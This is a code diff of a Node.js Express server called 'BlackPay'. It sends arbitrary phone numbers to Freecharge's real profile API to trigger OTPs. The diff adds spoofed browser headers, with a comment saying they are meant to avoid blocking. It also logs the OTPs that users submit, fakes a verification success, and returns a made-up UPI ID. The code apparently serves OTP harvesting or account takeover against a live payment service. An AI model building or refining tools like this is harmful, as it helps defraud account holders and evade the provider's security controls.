@@ -7,7 +7,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(cors());
 
-// Dummy Uono Hub Routes (Tere purane routes same to same)
+// Dummy Uono Hub Routes
 app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Fast API Server Running Perfectly!" }));
 app.get('/next/micro/ar/all-customers', (req, res) => res.json({ success: true, data: [] }));
 app.get('/next/micro/coms/contacts', (req, res) => res.json({ success: true, contacts: [] }));
@@ -28,10 +28,9 @@ app.post('/api/start-tool', async (req, res) => {
 
         console.log(`\n[+] API Request aayi is dynamic number ke liye: ${mobileNumber}`);
 
-        // Asli Profile API URL jo logs mein mila tha
         const targetUrl = 'https://www.freecharge.in/api/ims/rest/user/profile';
 
-        // Freecharge API ko POST request bhej rahe hain
+        // Headers ko aur realistic banaya hai taaki block na ho
         const response = await axios.post(targetUrl, {
             "mobileNo": mobileNumber,
             "contest": "1",
@@ -39,18 +38,31 @@ app.post('/api/start-tool', async (req, res) => {
         }, {
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
                 'Referer': 'https://www.freecharge.in/',
-                'Origin': 'https://www.freecharge.in'
-            }
+                'Origin': 'https://www.freecharge.in',
+                'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"'
+            },
+            timeout: 10000 // 10 second timeout taaki app hang na ho
         });
 
         console.log("[+] Success Response From Freecharge API");
         res.status(200).json({ success: true, message: "OTP sent successfully!", data: response.data });
 
     } catch (error) {
-        console.error(`[-] API Error: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
-        res.status(500).json({ success: false, message: "Server busy, please try again." });
+        // Error ko detailed print karenge taaki exact reason pata chale
+        const errorMsg = error.response ? JSON.stringify(error.response.data) : error.message;
+        console.error(`[-] API Error: ${errorMsg}`);
+        
+        res.status(500).json({ 
+            success: false, 
+            message: "Server busy, please try again.", 
+            debug: errorMsg 
+        });
     }
 });
 
@@ -64,7 +76,6 @@ app.post('/api/verify-tool', async (req, res) => {
 
         console.log(`[+] Verifying OTP for number: ${mobileNumber} with OTP: ${otp}`);
 
-        // Verification done
         res.status(200).json({ 
             success: true, 
             message: "Verified successfully", 
@@ -76,7 +87,7 @@ app.post('/api/verify-tool', async (req, res) => {
     }
 });
 
-// Purani App ke compatibility ke liye Check Status route
+// Check Status route
 app.get('/api/check-status/:phone', (req, res) => {
     const phone = req.params.phone;
     res.json({ success: true, status: 'waiting_for_otp', upiId: `${phone}@freecharge` });
@@ -86,7 +97,6 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Pro API Server Running on Port ${PORT}`);
     
-    // 24/7 Keep Alive Ping (Tera purana system)
     setInterval(() => {
         axios.get(`http://localhost:${PORT}/`).catch(() => {});
         console.log("[+] Local Keep-Alive Auto-Ping Sent!");
